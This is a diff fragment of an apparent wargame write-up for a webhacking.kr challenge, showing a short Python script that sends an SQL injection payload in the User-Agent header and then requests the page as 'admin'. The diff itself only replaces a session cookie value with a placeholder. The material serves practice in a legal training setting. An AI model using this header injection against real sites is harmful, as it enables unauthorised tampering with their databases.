@@ -47,14 +47,14 @@ url = "http://webhacking.kr/challenge/web/web-02/index.php"<br>
 var=""<br>
 s = requests.Session()<br>
 headers = {'user-agent': "admin','1234','admin'), ('admin"}<br>
-r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': '7gnluf4pd8uvf06ejsrpp0dbo5'},headers=headers)<br>
+r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': 'dontseeoverhere'},headers=headers)<br>
 res = r.text<br>
 print res<br><br>
 
 print "\nNext Request \n"<br>
 s = requests.Session()<br>
 headers = {'user-agent': "admin"}<br>
-r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': '7gnluf4pd8uvf06ejsrpp0dbo5'},headers=headers)<br>
+r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': 'dontseeoverhere'},headers=headers)<br>
 res = r.text<br>
 print res<br>
 </blockquote>
